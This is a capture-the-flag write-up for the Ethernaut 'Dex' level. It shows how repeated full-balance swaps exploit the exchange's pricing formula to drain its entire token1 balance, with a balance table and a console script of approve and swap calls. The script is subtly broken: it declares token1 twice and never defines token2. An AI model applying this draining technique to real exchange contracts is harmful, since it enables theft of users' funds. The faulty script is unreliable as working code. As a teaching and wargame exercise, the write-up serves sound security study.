## Solution

The goal of this challenge is to steal the entire balance of at least one of the two tokens from the dex.

When executing the `swap()` function twice in a row, i.e., swapping 10 `token1` for 10 `token2` and subsequently swapping our entire balance of 20 `token2`, we notice that we receive 24 `token1`!
In other words, we can drain one of the tokens from the dex entirely, simply by swapping the player's entire balance back and forth multiple times in a row.

More specifically, we have the following table, where p1 and p2 are the player's balances of `token1` and `token2` and d1 and d2 are the dex's balances, respectively:

| p1 | p2 | d1  | d2  | `swapAmount` for next swap |
|----|----|-----|-----|----------------------------|
| 10 | 10 | 100 | 100 | -                          |
|  0 | 20 | 110 |  90 | 20 * 110 / 90 = 24         |
| 24 |  0 |  86 | 110 | 24 * 110 / 86 = 30         |
|  0 | 30 | 110 |  80 | 30 * 110 / 80 = 41         |
| 41 |  0 |  69 | 110 | 41 * 110 / 69 = 65         |
| 0  | 65 | 110 | 45  | 65 * 110 / 45 = 158        | 

Notice that, if we were to swap the player's entire balance of 65 `token2` in the last of the above steps, we'd end up with 158 `token1` according to our table.
This, however, would exceed the dex's `token1` balance!
For this reason, we must swap an amount such that `swapAmount` becomes 110 instead of 158.
In other words, we need to solve

```
x * 110 / 45 == 110
```

which tells us that our last swap needs to exchange 45 instead of 65 `token2`.
This way, we ensure to get precisely 110 `token1` back, draining the entire `token1` balance from the dex.

Lastly, notice that we need to first approve the dex for a sufficiently high amount of both `token1` and `token2` in order to execute the above sequence.
Looking at the above table, we see that an allowance of 1000 is more than enough.

As a summary, we can solve the level via the Ethernaut console as follows:

```javascript
const token1 = await contract.token1()
const token1 = await contract.token1()

await contract.approve(contract.address, 1000)

await contract.swap(token1, token2, 10)
await contract.swap(token2, token1, 20)
await contract.swap(token1, token2, 24)
await contract.swap(token2, token1, 30)
await contract.swap(token1, token2, 41)

await contract.swap(token2, token1, 45)
```
